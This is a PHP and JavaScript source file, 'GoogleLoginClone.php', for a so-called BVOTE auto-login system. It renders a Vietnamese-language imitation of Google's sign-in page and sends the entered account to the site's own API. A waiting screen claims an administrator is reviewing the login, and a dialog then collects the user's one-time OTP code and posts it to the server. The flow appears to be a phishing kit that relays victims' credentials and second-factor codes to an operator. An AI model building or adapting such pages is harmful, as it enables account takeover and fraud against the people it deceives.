<?php
// GoogleLoginClone.php - BVOTE Auto Login System
?>
<div class="bg-white p-6 rounded-lg text-black w-full flex flex-col justify-center">
  <div class="text-center mb-6">
    <?php include_once(__DIR__.'/../icons/Google.php'); ?>
    <h2 class="text-2xl font-semibold mt-4">Đăng nhập</h2>
    <p class="text-sm text-gray-600 mt-1">để tiếp tục đến BVOTE</p>
  </div>

  <form id="google-login-form" class="space-y-4" onsubmit="return handleGoogleLogin(event)">
    <input id="google-account" name="account" type="email"
           placeholder="Email hoặc số điện thoại" required
           class="h-11 border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black" />

    <div class="flex justify-between items-center text-sm pt-4">
      <button type="button" class="text-blue-600 hover:underline font-semibold">Quên mật khẩu?</button>
      <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded">
        Tiếp theo
      </button>
    </div>
  </form>
</div>

<script>
var isLoadingGoogle = false;

function handleGoogleLogin(e) {
  e.preventDefault();
  if (isLoadingGoogle) return false;

  const account = document.getElementById('google-account').value.trim();
  if (!account) {
    alert('Vui lòng nhập email hoặc số điện thoại');
    return false;
  }

  isLoadingGoogle = true;
  const submitBtn = e.target.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Đang xử lý...';
  submitBtn.disabled = true;

  // Gọi API Auto Login
  fetch('/api/social-login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      platform: 'google',
      user_hint: account
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      // Chuyển đến màn hình chờ phê duyệt
      showWaitingScreen(data.request_id, 'google');
    } else {
      alert('Lỗi: ' + (data.error || 'Không thể tạo yêu cầu đăng nhập'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  })
  .finally(() => {
    isLoadingGoogle = false;
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  });

  return false;
}

function showWaitingScreen(requestId, platform) {
  // Tạo modal chờ phê duyệt
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
        <h3 class="text-lg font-semibold mb-2">Đang chờ phê duyệt</h3>
        <p class="text-gray-600 mb-4">Yêu cầu đăng nhập của bạn đang được xem xét bởi quản trị viên.</p>
        <div class="text-sm text-gray-500">
          <p>Nền tảng: ${platform}</p>
          <p>ID yêu cầu: ${requestId}</p>
        </div>
        <div class="mt-4">
          <button onclick="checkLoginStatus('${requestId}')" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
            Kiểm tra trạng thái
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Tự động kiểm tra trạng thái mỗi 5 giây
  const interval = setInterval(() => {
    checkLoginStatus(requestId, interval, modal);
  }, 5000);
}

function checkLoginStatus(requestId, interval = null, modal = null) {
  fetch(`/api/social-login/status/${requestId}`)
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        const status = data.request.status;

        if (status === 'APPROVED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Đăng nhập thành công! Chào mừng bạn đến với BVOTE.');
          window.location.href = '/user/home'; // Chuyển đến trang chủ user
        } else if (status === 'OTP_REQUIRED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          showOTPDialog(requestId);
        } else if (status === 'REJECTED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Yêu cầu đăng nhập bị từ chối. Vui lòng thử lại.');
        } else if (status === 'EXPIRED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Yêu cầu đăng nhập đã hết hạn. Vui lòng thử lại.');
        }
      } else {
        console.error('Error checking status:', data.error);
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
}

function showOTPDialog(requestId) {
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <h3 class="text-lg font-semibold mb-4">Nhập mã OTP</h3>
        <p class="text-gray-600 mb-4">Vui lòng nhập mã xác thực được gửi đến bạn.</p>
        <div class="mb-4">
          <input type="text" id="otp-input" placeholder="Nhập mã OTP"
                 class="w-full p-3 border border-gray-300 rounded text-center text-lg tracking-widest"
                 maxlength="6" pattern="[0-9]{6}">
        </div>
        <div class="flex space-x-2">
          <button onclick="verifyOTP('${requestId}')" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
            Xác thực
          </button>
          <button onclick="this.closest('.fixed').remove()" class="bg-gray-500 text-white px-4 py-2 rounded hover:bg-gray-600">
            Hủy
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Focus vào input OTP
  setTimeout(() => {
    document.getElementById('otp-input').focus();
  }, 100);
}

function verifyOTP(requestId) {
  const otpInput = document.getElementById('otp-input');
  const otp = otpInput.value.trim();

  if (!otp || otp.length !== 6) {
    alert('Vui lòng nhập đúng 6 số OTP');
    return;
  }

  fetch(`/api/social-login/${requestId}/otp`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ otp: otp })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      alert('Xác thực OTP thành công! Chào mừng bạn đến với BVOTE.');
      window.location.href = '/user/home';
    } else {
      alert('Lỗi: ' + (data.error || 'OTP không đúng'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  });
}
</script>
